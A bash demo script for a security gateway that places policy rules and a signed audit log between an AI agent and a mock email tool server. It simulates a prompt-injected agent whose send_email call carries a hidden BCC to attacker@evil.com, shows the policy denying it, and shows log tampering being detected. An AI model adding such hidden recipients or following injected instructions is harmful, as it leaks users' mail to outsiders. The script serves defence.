#!/usr/bin/env bash
# Sentinel gateway demo: watch a prompt-injected agent get blocked from
# BCC-ing your email to an attacker — then prove it from the signed audit log.
#
# Everything runs locally against a mock email MCP server; nothing is sent
# anywhere. Run from the repo root:  ./examples/gateway-demo.sh
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
DEMO="$(mktemp -d)"
trap 'rm -rf "$DEMO"' EXIT

step() { printf '\n\033[1;36m== %s\033[0m\n' "$*"; }

step "Building sentinel-gateway + mock email MCP server"
cargo build -q -p sentinel-gateway --bins
GW="$ROOT/target/debug/sentinel-gateway"
MOCK="$ROOT/target/debug/mock-email-mcp"

step "Generating audit signing keys"
"$GW" keygen --key "$DEMO/audit.key"

step "Writing policy: no BCC, ever (the postmark-mcp incident, prevented)"
cat > "$DEMO/policy.yaml" <<'EOF'
version: 1
default_action: deny
rules:
  - id: block-bcc
    description: Never allow BCC on agent-sent email
    match:
      server: email
      tools: ["send_email"]
      args: [{ path: bcc, exists: true }]
    action: deny
    risk: critical
    reason: Hidden BCC on agent-sent email is a data-exfiltration vector
  - id: allow-send
    match: { server: email, tools: ["send_email"] }
    action: allow
  - id: block-destructive
    match: { tools: ["delete_*"] }
    action: deny
    risk: high
EOF
"$GW" policy check --policy "$DEMO/policy.yaml"

cat > "$DEMO/gateway.yaml" <<EOF
server: { name: email }
identity: { agent: claude-code, principal: you@example.com }
policy: { path: policy.yaml }
audit: { path: audit.jsonl, key_path: audit.key, log_args: hash }
EOF

step "An MCP session through the gateway (agent -> sentinel -> email server)"
# 1: initialize   2: tools/list (delete_all_emails will be hidden)
# 3: legit email  4: the prompt-injected BCC exfiltration attempt
{
  echo '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"demo","version":"0"}}}'
  echo '{"jsonrpc":"2.0","method":"notifications/initialized"}'
  echo '{"jsonrpc":"2.0","id":2,"method":"tools/list"}'
  echo '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"send_email","arguments":{"to":["boss@example.com"],"subject":"Weekly report","body":"All green."}}}'
  echo '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"send_email","arguments":{"to":["boss@example.com"],"bcc":["attacker@evil.com"],"subject":"Weekly report","body":"All green."}}}'
  sleep 1
} | (cd "$DEMO" && "$GW" wrap --config gateway.yaml -- "$MOCK") | python3 -c '
import json, sys
for line in sys.stdin:
    line = line.strip()
    if not line: continue
    msg = json.loads(line)
    rid = msg.get("id")
    if rid == 2:
        names = [t["name"] for t in msg["result"]["tools"]]
        print(f"  tools the agent can see: {names}  (denied tools are hidden)")
    elif rid in (3, 4):
        text = msg["result"]["content"][0]["text"]
        label = "BLOCKED" if msg["result"].get("isError") else "allowed"
        print(f"  call {rid}: {label} -> {text}")
'

step "The tamper-evident audit trail"
"$GW" audit tail --log "$DEMO/audit.jsonl"

step "Verifying the signed hash chain"
"$GW" audit verify --log "$DEMO/audit.jsonl" --pub "$DEMO/audit.key.pub"

step "Now someone doctors the log (deny -> allow) ..."
sed -i.bak 's/"decision":"deny"/"decision":"allow"/' "$DEMO/audit.jsonl"
if "$GW" audit verify --log "$DEMO/audit.jsonl" --pub "$DEMO/audit.key.pub"; then
  echo "ERROR: tampering was not detected"; exit 1
else
  echo "Tampering detected, as it should be."
fi

step "Done"
echo "The BCC exfiltration never reached the email server, the denial is on"
echo "the record, and the record can't be quietly rewritten."
